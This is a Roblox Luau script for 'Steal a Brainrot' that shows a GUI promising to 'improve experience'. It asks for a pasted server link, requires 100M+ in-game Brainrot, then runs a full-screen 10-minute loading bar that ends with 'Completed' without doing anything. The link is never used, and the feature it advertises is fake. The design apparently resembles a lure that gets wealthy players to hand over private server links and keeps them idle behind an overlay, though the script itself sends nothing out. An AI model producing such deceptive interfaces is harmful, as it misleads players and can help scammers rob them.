--[[
    Brainrot Experience GUI
    A clean, modern GUI for improving player experience in "Steal a Brainrot"
--]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- Configuration
local LOADING_DURATION = 600 -- 10 minutes in seconds
local REQUIRED_BRAINROT = 100000000 -- 100M

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BrainrotExperienceGUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Add rounded corners
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 16)
mainCorner.Parent = mainFrame

-- Add shadow effect
local mainShadow = Instance.new("UIStroke")
mainShadow.Color = Color3.fromRGB(100, 100, 150)
mainShadow.Thickness = 2
mainShadow.Transparency = 0.7
mainShadow.Parent = mainFrame

-- Title
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.Position = UDim2.new(0, 0, 0, 20)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Melhorar Experiência"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 24
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Parent = mainFrame

-- Input Box Frame
local inputFrame = Instance.new("Frame")
inputFrame.Name = "InputFrame"
inputFrame.Size = UDim2.new(0.9, 0, 0, 50)
inputFrame.Position = UDim2.new(0.05, 0, 0, 80)
inputFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = mainFrame

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = inputFrame

-- Input Box
local inputBox = Instance.new("TextBox")
inputBox.Name = "InputBox"
inputBox.Size = UDim2.new(1, -20, 1, 0)
inputBox.Position = UDim2.new(0, 10, 0, 0)
inputBox.BackgroundTransparency = 1
inputBox.Text = ""
inputBox.PlaceholderText = "Cole o link do servidor aqui..."
inputBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.TextSize = 16
inputBox.Font = Enum.Font.Gotham
inputBox.TextXAlignment = Enum.TextXAlignment.Left
inputBox.ClearTextOnFocus = false
inputBox.Parent = inputFrame

-- Done Button
local doneButton = Instance.new("TextButton")
doneButton.Name = "DoneButton"
doneButton.Size = UDim2.new(0.6, 0, 0, 45)
doneButton.Position = UDim2.new(0.2, 0, 0, 150)
doneButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
doneButton.BorderSizePixel = 0
doneButton.Text = "Done"
doneButton.TextColor3 = Color3.fromRGB(255, 255, 255)
doneButton.TextSize = 18
doneButton.Font = Enum.Font.GothamBold
doneButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = doneButton

-- Button hover effect
local function onButtonHover()
    TweenService:Create(doneButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(100, 160, 210)
    }):Play()
end

local function onButtonLeave()
    TweenService:Create(doneButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(70, 130, 180)
    }):Play()
end

doneButton.MouseEnter:Connect(onButtonHover)
doneButton.MouseLeave:Connect(onButtonLeave)

-- Notification Frame (hidden by default)
local notificationFrame = Instance.new("Frame")
notificationFrame.Name = "NotificationFrame"
notificationFrame.Size = UDim2.new(0, 350, 0, 60)
notificationFrame.Position = UDim2.new(0.5, -175, 0.85, 0)
notificationFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
notificationFrame.BorderSizePixel = 0
notificationFrame.Visible = false
notificationFrame.Parent = screenGui

local notificationCorner = Instance.new("UICorner")
notificationCorner.CornerRadius = UDim.new(0, 12)
notificationCorner.Parent = notificationFrame

local notificationText = Instance.new("TextLabel")
notificationText.Name = "NotificationText"
notificationText.Size = UDim2.new(1, -20, 1, 0)
notificationText.Position = UDim2.new(0, 10, 0, 0)
notificationText.BackgroundTransparency = 1
notificationText.Text = ""
notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
notificationText.TextSize = 16
notificationText.Font = Enum.Font.Gotham
notificationText.TextWrapped = true
notificationText.Parent = notificationFrame

-- Loading Screen (hidden by default)
local loadingScreen = Instance.new("Frame")
loadingScreen.Name = "LoadingScreen"
loadingScreen.Size = UDim2.new(1, 0, 1, 0)
loadingScreen.Position = UDim2.new(0, 0, 0, 0)
loadingScreen.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
loadingScreen.BorderSizePixel = 0
loadingScreen.Visible = false
loadingScreen.Parent = screenGui

-- Loading Title
local loadingTitle = Instance.new("TextLabel")
loadingTitle.Name = "LoadingTitle"
loadingTitle.Size = UDim2.new(1, 0, 0, 100)
loadingTitle.Position = UDim2.new(0, 0, 0.3, 0)
loadingTitle.BackgroundTransparency = 1
loadingTitle.Text = "Loading... Please wait"
loadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingTitle.TextSize = 32
loadingTitle.Font = Enum.Font.GothamBold
loadingTitle.Parent = loadingScreen

-- Loading Bar Background
local loadingBarBg = Instance.new("Frame")
loadingBarBg.Name = "LoadingBarBg"
loadingBarBg.Size = UDim2.new(0.6, 0, 0, 20)
loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
loadingBarBg.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
loadingBarBg.BorderSizePixel = 0
loadingBarBg.Parent = loadingScreen

local loadingBarBgCorner = Instance.new("UICorner")
loadingBarBgCorner.CornerRadius = UDim.new(0, 10)
loadingBarBgCorner.Parent = loadingBarBg

-- Loading Bar Fill
local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.Position = UDim2.new(0, 0, 0, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
loadingBarFill.BorderSizePixel = 0
loadingBarFill.Parent = loadingBarBg

local loadingBarFillCorner = Instance.new("UICorner")
loadingBarFillCorner.CornerRadius = UDim.new(0, 10)
loadingBarFillCorner.Parent = loadingBarFill

-- Completion Message (hidden by default)
local completionMessage = Instance.new("TextLabel")
completionMessage.Name = "CompletionMessage"
completionMessage.Size = UDim2.new(1, 0, 0, 100)
completionMessage.Position = UDim2.new(0, 0, 0.6, 0)
completionMessage.BackgroundTransparency = 1
completionMessage.Text = ""
completionMessage.TextColor3 = Color3.fromRGB(100, 255, 100)
completionMessage.TextSize = 36
completionMessage.Font = Enum.Font.GothamBold
completionMessage.Parent = loadingScreen

-- Helper function to show notification
local function showNotification(message, duration)
    notificationText.Text = message
    notificationFrame.Visible = true
    
    -- Animate in
    notificationFrame.Position = UDim2.new(0.5, -175, 0.9, 0)
    TweenService:Create(notificationFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
        Position = UDim2.new(0.5, -175, 0.85, 0)
    }):Play()
    
    -- Hide after duration
    task.wait(duration)
    
    -- Animate out
    local tweenOut = TweenService:Create(notificationFrame, TweenInfo.new(0.3), {
        Position = UDim2.new(0.5, -175, 0.9, 0)
    })
    tweenOut:Play()
    tweenOut.Completed:Wait()
    notificationFrame.Visible = false
end

-- Helper function to get player's Brainrot value
local function getBrainrotValue()
    -- Check for leaderstats first
    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local brainrot = leaderstats:FindFirstChild("Brainrot")
        if brainrot and brainrot:IsA("IntValue") then
            return brainrot.Value
        end
    end
    
    -- If no leaderstats, check for a Value object in PlayerGui or similar
    -- For simulation purposes, you can modify this value
    local simulatedBrainrot = player:FindFirstChild("BrainrotValue")
    if simulatedBrainrot and simulatedBrainrot:IsA("IntValue") then
        return simulatedBrainrot.Value
    end
    
    -- Return 0 if no Brainrot value found
    return 0
end

-- Main function to handle Done button click
local function onDoneClick()
    local inputText = inputBox.Text
    local lowerInput = string.lower(inputText)
    
    -- Check if input is empty or doesn't contain "server"
    if inputText == "" or not string.find(lowerInput, "server") then
        showNotification("Adicione um link de server valido", 3)
        return
    end
    
    -- Check if player has enough Brainrot
    local brainrotValue = getBrainrotValue()
    if brainrotValue < REQUIRED_BRAINROT then
        showNotification("Para melhorar a experiência, você precisa ter um Brainrot de 100M+", 4)
        return
    end
    
    -- All checks passed - start loading
    mainFrame.Visible = false
    loadingScreen.Visible = true
    
    -- Animate loading bar over 10 minutes
    local startTime = tick()
    local elapsed = 0
    
    while elapsed < LOADING_DURATION do
        elapsed = tick() - startTime
        local progress = math.min(elapsed / LOADING_DURATION, 1)
        
        -- Update loading bar size
        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        
        task.wait(0.1)
    end
    
    -- Loading complete
    loadingTitle.Visible = false
    loadingBarBg.Visible = false
    completionMessage.Text = "Completed"
end

-- Connect Done button event
doneButton.MouseButton1Click:Connect(onDoneClick)

-- Optional: Allow Enter key to submit
inputBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        onDoneClick()
    end
end)

print("Brainrot Experience GUI loaded successfully!")
